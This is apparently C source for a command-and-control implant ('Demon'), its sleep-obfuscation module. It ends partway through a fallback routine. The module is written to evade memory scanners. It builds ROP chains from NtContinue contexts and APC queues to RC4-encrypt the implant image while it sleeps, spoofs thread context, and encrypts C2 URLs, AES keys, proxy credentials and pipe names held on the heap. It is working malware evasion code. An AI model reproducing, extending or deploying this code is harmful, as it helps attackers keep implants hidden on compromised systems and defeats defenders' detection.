#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/AgentProtection.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>

/* Memory encryption is handled by SystemFunction032 (advapi32) called from within
 * the ROP chains of Ekko/Zilean/Foliage. SystemFunction032 implements RC4 which is
 * symmetric — calling it twice with the same key encrypts then decrypts. Because it
 * lives in advapi32 (outside the agent image), it can execute after the image is
 * encrypted. This eliminates the need for any custom encrypt/decrypt functions in
 * the agent image itself. The previous MemoryManagementObf/Deobf functions were
 * broken stubs that just zeroed memory — and even if implemented, they would have
 * been encrypted along with the rest of the image, crashing the ROP chain. */

/* =========================================================================
 * HEAP SENSITIVE DATA ENCRYPTION
 *
 * During sleep, the agent image [ImgBase, ImgBase+ImgSize) is RC4-encrypted.
 * But heap-allocated config strings, crypto keys, and other sensitive data
 * live OUTSIDE the image range and remain cleartext. A memory scanner can
 * find C2 URLs, AES keys, pipe names, etc. on the heap during sleep.
 *
 * Fix: Before triggering image encryption, RC4-encrypt all sensitive heap
 * buffers in-place. The RC4 key is stored in g_HeapCryptoKey (SEC_DATA —
 * lives in .data section within the image). When the image is encrypted,
 * the heap key is protected. On wake, image decryption restores the key,
 * which we use to decrypt the heap buffers.
 *
 * RC4 is symmetric: same function encrypts and decrypts. HeapEncryptDecrypt
 * is called once before sleep (encrypt) and once after (decrypt).
 * ========================================================================= */

/* Lives in .data section — encrypted with the agent image during sleep.
 * This is the ONLY copy of the heap RC4 key after the stack copy is zeroed. */
SEC_DATA BYTE g_HeapCryptoKey[16] = { 0 };

/*!
 * @brief RC4-encrypt/decrypt a single heap buffer via SystemFunction032.
 * NULL buffer or zero size is a no-op.
 */
static VOID Rc4HeapBuffer(
    _In_ PVOID  Buffer,
    _In_ SIZE_T Size,
    _In_ PBYTE  Key,
    _In_ DWORD  KeyLen
) {
    if ( !Buffer || !Size ) return;

    USTRING Buf = { 0 };
    USTRING K   = { 0 };

    Buf.Buffer        = Buffer;
    Buf.Length         = (DWORD)Size;
    Buf.MaximumLength = (DWORD)Size;

    K.Buffer        = Key;
    K.Length         = KeyLen;
    K.MaximumLength = KeyLen;

    Instance->Win32.SystemFunction032( &Buf, &K );
}

/*!
 * @brief Encrypt or decrypt ALL sensitive heap-allocated data.
 *
 * RC4 is symmetric — calling with the same key twice restores the original.
 * Called once before image encryption (protect heap) and once after image
 * decryption (restore heap for normal operation).
 *
 * Protected data:
 *   - AES session keys (Key, IV, MacKey) — 80 bytes total
 *   - Pre-shared key (PSK) — variable
 *   - HTTP: method, user-agent, URIs, headers, proxy config, host strings
 *   - SMB: pipe name
 *   - Spawn process paths
 */
static VOID HeapEncryptDecrypt(
    _In_ PBYTE Key,
    _In_ DWORD KeyLen
) {
    if ( !Instance->Win32.SystemFunction032 ) return;

    /* === Cryptographic key material (fixed sizes) === */
    Rc4HeapBuffer( Instance->Config.AES.Key,    KEX_KEY_LEN,   Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.AES.IV,     KEX_NONCE_LEN, Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.AES.MacKey, KEX_KEY_LEN,   Key, KeyLen );

    /* Pre-shared key */
    Rc4HeapBuffer( Instance->Config.PskCfg.Psk, Instance->Config.PskCfg.PskLen, Key, KeyLen );

#ifdef TRANSPORT_HTTP
    /* === HTTP transport config strings === */
    Rc4HeapBuffer( Instance->Config.Transport.Method,    Instance->Config.Transport.MethodLen,    Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.Transport.UserAgent, Instance->Config.Transport.UserAgentLen, Key, KeyLen );

    /* URI array (per-element encryption) */
    for ( DWORD i = 0; i < Instance->Config.Transport.NumUris; i++ )
        Rc4HeapBuffer( Instance->Config.Transport.Uris[i], Instance->Config.Transport.UriLens[i], Key, KeyLen );

    /* Header array (per-element encryption) */
    for ( DWORD i = 0; i < Instance->Config.Transport.NumHeaders; i++ )
        Rc4HeapBuffer( Instance->Config.Transport.Headers[i], Instance->Config.Transport.HeaderLens[i], Key, KeyLen );

    /* Proxy credentials */
    Rc4HeapBuffer( Instance->Config.Transport.Proxy.Url,      Instance->Config.Transport.Proxy.UrlLen,      Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.Transport.Proxy.Username,  Instance->Config.Transport.Proxy.UsernameLen, Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.Transport.Proxy.Password,  Instance->Config.Transport.Proxy.PasswordLen, Key, KeyLen );

    /* Host linked list (every host string) */
    for ( PHOST_DATA h = Instance->Config.Transport.Hosts; h; h = h->Next )
        Rc4HeapBuffer( h->Host, h->HostLen, Key, KeyLen );
#endif

#ifdef TRANSPORT_SMB
    /* === SMB pipe name === */
    Rc4HeapBuffer( Instance->Config.Transport.Name, Instance->Config.Transport.NameLen, Key, KeyLen );
#endif

    /* === Spawn process paths === */
    Rc4HeapBuffer( Instance->Config.Process.Spawn64, Instance->Config.Process.Spawn64Len, Key, KeyLen );
    Rc4HeapBuffer( Instance->Config.Process.Spawn86, Instance->Config.Process.Spawn86Len, Key, KeyLen );
}

/*!
 * @brief Generate a random heap encryption key, store it in g_HeapCryptoKey
 * (SEC_DATA, protected by image encryption), and encrypt all heap data.
 * The stack copy is zeroed immediately — only the .data copy survives.
 */
static VOID HeapProtectBeforeSleep( VOID )
{
    BYTE HpKey[16];
    for ( BYTE i = 0; i < 16; i++ ) HpKey[i] = (BYTE)RandomNumber32();
    MemCopy( g_HeapCryptoKey, HpKey, sizeof( HpKey ) );
    HeapEncryptDecrypt( HpKey, sizeof( HpKey ) );
    RtlSecureZeroMemory( HpKey, sizeof( HpKey ) );
}

/*!
 * @brief Decrypt heap data after image decryption restores g_HeapCryptoKey.
 * Zeroes the key from .data after use.
 */
static VOID HeapRestoreAfterSleep( VOID )
{
    HeapEncryptDecrypt( g_HeapCryptoKey, sizeof( g_HeapCryptoKey ) );
    RtlSecureZeroMemory( g_HeapCryptoKey, sizeof( g_HeapCryptoKey ) );
}

#if _WIN64

/*!
 * @brief
 *  foliage is a sleep obfuscation technique that is using APC calls
 *  to obfuscate itself in memory
 *
 * @param Param
 * @return
 */
VOID FoliageObf(
    IN PSLEEP_PARAM Param
) {
    USTRING             Key         = { 0 };
    USTRING             Img         = { 0 };
    UCHAR               Random[16]  = { 0 };

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = { 0 };
    PCONTEXT            RopCap      = { 0 };
    PCONTEXT            RopSpoof    = { 0 };

    PCONTEXT            RopBegin    = { 0 };
    PCONTEXT            RopSetMemRw = { 0 };
    PCONTEXT            RopMemEnc   = { 0 };
    PCONTEXT            RopGetCtx   = { 0 };
    PCONTEXT            RopSetCtx   = { 0 };
    PCONTEXT            RopWaitObj  = { 0 };
    PCONTEXT            RopMemDec   = { 0 };
    PCONTEXT            RopSetMemRx = { 0 };
    PCONTEXT            RopSetCtx2  = { 0 };
    PCONTEXT            RopExitThd  = { 0 };

    LPVOID              ImageBase   = NULL;
    SIZE_T              ImageSize   = 0;
    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
    SIZE_T              TmpValue    = 0;

    ImageBase = Instance->Session.ModuleBase;
    ImageSize = Instance->Session.ModuleSize;

    // Check if .text section is defined
    if (Instance->Session.TxtBase != 0 && Instance->Session.TxtSize != 0) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        dwProtect  = PAGE_EXECUTE_READ;
    } else {
        TxtBase = Instance->Session.ModuleBase;
        TxtSize = Instance->Session.ModuleSize;
    }

    /* set up USTRING for SystemFunction032 (RC4 encrypt/decrypt of agent image) */
    Img.Buffer = ImageBase;
    Img.Length  = Img.MaximumLength = (DWORD)ImageSize;

    // Generate random keys
    for ( SHORT i = 0; i < 16; i++ )
        Random[ i ] = RandomNumber32( );

    Key.Buffer = &Random;
    Key.Length = Key.MaximumLength = 0x10;

    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            RopInit     = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCap      = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSpoof    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopBegin    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemEnc   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopGetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopWaitObj  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemDec   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRx = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx2  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopExitThd  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( hThread, RopInit ) ) )
                {
                    MemCopy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopGetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopWaitObj,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemDec,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRx, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx2,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopExitThd,  RopInit, sizeof( CONTEXT ) );

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip  = U_PTR( Instance->Win32.NtWaitForSingleObject );
                    RopBegin->Rsp -= U_PTR( 0x1000 * 13 );
                    RopBegin->Rcx  = U_PTR( hEvent );
                    RopBegin->Rdx  = U_PTR( FALSE );
                    RopBegin->R8   = U_PTR( NULL );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRw->Rsp -= U_PTR( 0x1000 * 12 );
                    RopSetMemRw->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw->R8   = U_PTR( &ImageSize );
                    RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    // RC4 encrypt agent image — SystemFunction032 is in advapi32 (survives image encryption)
                    RopMemEnc->ContextFlags = CONTEXT_FULL;
                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                    RopMemEnc->Rcx  = U_PTR( &Img );
                    RopMemEnc->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Img, &Key );

                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip  = U_PTR( Instance->Win32.NtGetContextThread );
                    RopGetCtx->Rsp -= U_PTR( 0x1000 * 10 );
                    RopGetCtx->Rcx  = U_PTR( hDupObj );
                    RopGetCtx->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtGetContextThread( Src, Cap );

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                    RopSetCtx->Rcx  = U_PTR( hDupObj );
                    RopSetCtx->Rdx  = U_PTR( RopSpoof );
                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Spf );

                    // Sleep — wait on custom event (overlapped I/O) or duplicated thread handle (pure timeout)
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip  = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                    RopWaitObj->Rsp -= U_PTR( 0x1000 * 8 );
                    RopWaitObj->Rcx  = U_PTR( Param->WaitHandle ? Param->WaitHandle : hDupObj );
                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                    RopWaitObj->R8   = U_PTR( FALSE );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // WaitForSingleObjectEx( WaitHandle|Src, Fbr->Time, FALSE );

                    // RC4 decrypt agent image — same key produces same keystream, XOR restores original
                    RopMemDec->ContextFlags = CONTEXT_FULL;
                    RopMemDec->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
                    RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                    RopMemDec->Rcx  = U_PTR( &Img );
                    RopMemDec->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // SystemFunction032( &Img, &Key );

                    // RW -> RWX
                    RopSetMemRx->ContextFlags = CONTEXT_FULL;
                    RopSetMemRx->Rip  = U_PTR( Instance->Win32.NtProtectVirtualMemory );
                    RopSetMemRx->Rsp -= U_PTR( 0x1000 * 6 );
                    RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRx->Rdx  = U_PTR( &TxtBase );
                    RopSetMemRx->R8   = U_PTR( &TxtSize );
                    RopSetMemRx->R9   = U_PTR( dwProtect );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( & TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );

                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip  = U_PTR( Instance->Win32.NtSetContextThread );
                    RopSetCtx2->Rsp -= U_PTR( 0x1000 * 5 );
                    RopSetCtx2->Rcx  = U_PTR( hDupObj );
                    RopSetCtx2->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // NtSetContextThread( Src, Cap );

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                    RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                    RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                    // RtlExitUserThread( ERROR_SUCCESS );

                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;

                    if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                    {
                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                        RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers

                        /* Cache sleeping flag pointer BEFORE encryption (stack local survives RC4).
                         * After image decryption, clear the flag so real VEH handler is active again. */
                        volatile DWORD* FolSleepFlagPtr = Instance->SleepGuard.SleepingFlag;
                        if ( FolSleepFlagPtr ) *FolSleepFlagPtr = 1;

                        /* Encrypt sensitive heap data before image encryption.
                         * Key stored in g_HeapCryptoKey (.data) — protected by image encryption. */
                        HeapProtectBeforeSleep();

                        // Execute every registered Apc thread
                        SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );

                        /* Image decrypted — g_HeapCryptoKey restored. Decrypt heap. */
                        HeapRestoreAfterSleep();

                        if ( FolSleepFlagPtr ) *FolSleepFlagPtr = 0;
                    }
                }
            }
            
        }
    }

Leave:
    if ( RopExitThd != NULL ) {
        Instance->Win32.LocalFree( RopExitThd );
        RopExitThd = NULL;
    }

    if ( RopSetCtx2 != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx2 );
        RopSetCtx2 = NULL;
    }

    if ( RopSetMemRx != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRx );
        RopSetMemRx = NULL;
    }

    if ( RopMemDec != NULL ) {
        Instance->Win32.LocalFree( RopMemDec );
        RopMemDec = NULL;
    }

    if ( RopWaitObj != NULL ) {
        Instance->Win32.LocalFree( RopWaitObj );
        RopWaitObj = NULL;
    }

    if ( RopSetCtx != NULL ) {
        Instance->Win32.LocalFree( RopSetCtx );
        RopSetCtx = NULL;
    }

    if ( RopSetMemRw != NULL ) {
        Instance->Win32.LocalFree( RopSetMemRw );
        RopSetMemRw = NULL;
    }

    if ( RopBegin != NULL ) {
        Instance->Win32.LocalFree( RopBegin );
        RopBegin = NULL;
    }

    if ( RopSpoof != NULL ) {
        Instance->Win32.LocalFree( RopSpoof );
        RopSpoof = NULL;
    }

    if ( RopCap != NULL ) {
        Instance->Win32.LocalFree( RopCap );
        RopCap = NULL;
    }

    if ( RopInit != NULL ) {
        Instance->Win32.LocalFree( RopInit );
        RopInit = NULL;
    }

    if ( hDupObj != NULL ) {
        SysNtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL ) {
        SysNtTerminateThread( hThread, STATUS_SUCCESS );
        hThread = NULL;
    }

    if ( hEvent != NULL ) {
        SysNtClose( hEvent );
        hEvent = NULL;
    }

    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    Instance->Win32.SwitchToFiber( Param->Master );
}

/*!
 * @brief
 *  ekko/zilean sleep obfuscation technique using
 *  Timers Api (RtlCreateTimer/RtlRegisterWait)
 *  with stack duplication/spoofing by duplicating the
 *  NT_TIB from another thread.
 *
 * @note
 *  this technique most likely wont work when the
 *  process is also actively using the timers api.
 *  So in future either use Veh + hardware breakpoints
 *  to create our own thread pool or leave it as it is.
 *
 * @param TimeOut
 * @param Method
 * @return
 */
BOOL TimerObf(
    _In_ ULONG  TimeOut,
    _In_ ULONG  Method,
    _In_ HANDLE WaitHandle
) {
    PRINTF( "TimerObf: ENTER method=%lu timeout=%lu handle=%p\n", Method, TimeOut, WaitHandle )

    /* Handles */
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    HANDLE   ThdSrc    = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait  = { 0 };
    UCHAR    Buf[ 16 ] = { 0 };
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    PVOID    ImgBase   = { 0 };
    ULONG    ImgSize   = { 0 };
    CONTEXT  TimerCtx  = { 0 };
    CONTEXT  ThdCtx    = { 0 };
    PCONTEXT Rop       = NULL;
    ULONG    Value     = { 0 };
    ULONG    Delay     = { 0 };
    BOOL     Success   = { 0 };
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = { 0 };
    ULONG    Inc       = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase   = { 0 };
    SIZE_T   TxtSize   = { 0 };
    ULONG    Protect   = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[]  = { 0xFF, 0xE0 };

    /* =======================================================================
     * HEAP PROTECTION: Encrypt sensitive heap data BEFORE any sleep path.
     *
     * The key is stored in g_HeapCryptoKey (SEC_DATA, in .data section).
     * When the image is RC4-encrypted during sleep, the key is protected.
     * After waking, image decryption restores the key for heap decryption.
     *
     * This must happen once at the top — both stub and NtContinue fallback
     * paths share the same encrypted heap state.
     * ======================================================================= */
    HeapProtectBeforeSleep();

    /* =======================================================================
     * PRIMARY PATH: Direct stub call (no timers, no thread pool)
     *
     * The stub lives outside the agent image (in the VEH trampoline allocation,
     * RX) and is called DIRECTLY as a function from the main thread:
     *   VP(RW) → RC4 encrypt → WaitForSingleObjectEx → RC4 decrypt → VP(RX)
     *
     * The main thread's stack is NOT part of the PE image and is never
     * encrypted. Return addresses on the stack point into the image, but by
     * the time the stub returns (ret), the image is already decrypted and RX.
     *
     * Zero per-cycle kernel object creation. No timer queues, no timer
     * objects, no events created/closed. Eliminates the 0xC0000409 crash
     * caused by thread pool internal state corruption after thousands of
     * RtlCreateTimer/DeleteTimerQueueTimer cycles.
     *
     * Falls through to legacy NtContinue ROP chain if stub is unavailable.
     * ======================================================================= */
    if ( Instance->SleepGuard.SleepCallback )
    {
        SLEEP_CALLBACK_CTX StubCtx = { 0 };
        BOOL   StubOk     = FALSE;

        PVOID  StImgBase  = Instance->Session.ModuleBase;
        ULONG  StImgSize  = Instance->Session.ModuleSize;
        PVOID  StTxtBase  = Instance->Session.TxtBase  ? Instance->Session.TxtBase  : StImgBase;
        SIZE_T StTxtSize  = Instance->Session.TxtSize  ? Instance->Session.TxtSize  : (SIZE_T)StImgSize;
        ULONG  StProtect  = Instance->Session.TxtBase  ? PAGE_EXECUTE_READ : PAGE_EXECUTE_READWRITE;

        /* WaitHandle for the stub's WaitForSingleObjectEx:
         *   - If caller provided a real handle (SMB pipe), use it.
         *   - Otherwise use CachedWaitEvent (unsignaled, created once at init).
         *     WFSO returns STATUS_TIMEOUT after Timeout ms = sleep. */
        HANDLE StWaitHandle = WaitHandle ? WaitHandle : Instance->SleepGuard.CachedWaitEvent;

        /* random RC4 key — fresh each cycle */
        for ( BYTE i = 0; i < 16; i++ ) Buf[ i ] = RandomNumber32();

        Key.Buffer = Buf;
        Key.Length  = Key.MaximumLength = sizeof( Buf );

        Img.Buffer = StImgBase;
        Img.Length  = Img.MaximumLength = StImgSize;

        if ( StWaitHandle )
        {
            /* populate context for the shellcode stub */
            StubCtx.pfnVirtualProtect        = C_PTR( Instance->Win32.VirtualProtect );
            StubCtx.pfnSystemFunction032     = C_PTR( Instance->Win32.SystemFunction032 );
            StubCtx.pfnWaitForSingleObjectEx = C_PTR( Instance->Win32.WaitForSingleObjectEx );
            StubCtx.pfnNtSetEvent            = C_PTR( Instance->Win32.NtSetEvent );
            StubCtx.ImgBase      = StImgBase;
            StubCtx.ImgSize      = (SIZE_T)StImgSize;
            StubCtx.TxtBase      = StTxtBase;
            StubCtx.TxtSize      = StTxtSize;
            StubCtx.TxtProtect   = StProtect;
            StubCtx.pOldProtect  = &Value;
            StubCtx.pImgUstring  = &Img;
            StubCtx.pKeyUstring  = &Key;
            StubCtx.WaitHandle   = StWaitHandle;
            StubCtx.Timeout      = TimeOut;
            StubCtx.EvntDone     = NULL; /* no completion event needed — stub returns directly */
            StubCtx.SleepingFlag = Instance->SleepGuard.SleepingFlag;

            /* Set DispatcherReturn = RtlExitUserThread so the VEH trampoline
             * can cleanly kill background threads that try to execute agent code
             * during the encrypted window. */
            if ( Instance->SleepGuard.DispatcherReturn )
                *Instance->SleepGuard.DispatcherReturn = U_PTR( Instance->Win32.RtlExitUserThread );

            PRINTF( "TimerObf: direct stub call, sleeping %lu ms\n", TimeOut )

            /* DIRECT CALL: cast the stub to a function pointer and invoke it.
             * The stub signature is WAITORTIMERCALLBACK(PVOID ctx, BOOLEAN fired)
             * but we only care about RCX = &StubCtx. RDX (fired) is ignored.
             *
             * The stub runs entirely from outside the agent image (RX page in
             * VEH trampoline allocation). All API addresses come from StubCtx
             * (on the stack). The stub encrypts the image, sleeps, decrypts,
             * restores RX, then returns normally via `ret`. */
            typedef VOID (NTAPI *PFN_SLEEP_STUB)( PVOID ctx, BOOLEAN fired );
            PFN_SLEEP_STUB pfnStub = (PFN_SLEEP_STUB) Instance->SleepGuard.SleepCallback;
            pfnStub( &StubCtx, TRUE );

            /* If we reach here, the stub returned normally:
             * image is decrypted and .text is back to RX. */
            StubOk = TRUE;

            PRINTF( "TimerObf: stub returned, VP old=0x%lx\n", Value )

            /* Clear DispatcherReturn — no longer in encrypted window */
            if ( Instance->SleepGuard.DispatcherReturn )
                *Instance->SleepGuard.DispatcherReturn = 0;
        }

        /* Zero sensitive stack data */
        RtlSecureZeroMemory( Buf, sizeof( Buf ) );
        RtlSecureZeroMemory( &StubCtx, sizeof( StubCtx ) );

        if ( StubOk ) {
            /* Image decrypted — g_HeapCryptoKey restored from .data. Decrypt heap. */
            HeapRestoreAfterSleep();
            return TRUE;
        }

        /* stub path failed — fall through to NtContinue ROP chain.
         * Heap is still encrypted; g_HeapCryptoKey still in .data (cleartext
         * since image was never encrypted, or was already decrypted). */
        PUTS( "TimerObf: stub path failed, falling through to NtContinue" )
        Success = FALSE;
        Value   = 0;
    }

    /* =======================================================================
     * FALLBACK: NtContinue ROP chain (legacy EKKO/ZILEAN)
     *
     * Only reached if SleepCallback stub is not available or failed.
     * This path has a known stability issue: after ~10 hours of continuous
     * operation (~63,000 NtContinue calls), the thread pool's timer thread
     * accumulates internal state corruption, eventually triggering
     * STATUS_STACK_BUFFER_OVERRUN (0xC0000409).
     * ======================================================================= */

    /* Heap-allocate the ROP array to avoid ~25KB stack allocation.
     * The ___chkstk_ms stub is a no-op in this build (no CRT), so large
     * stack frames skip the guard page and hit uncommitted memory → AV.
     * 20 CONTEXT structs × 1232 bytes = 24640 bytes (6 pages). */
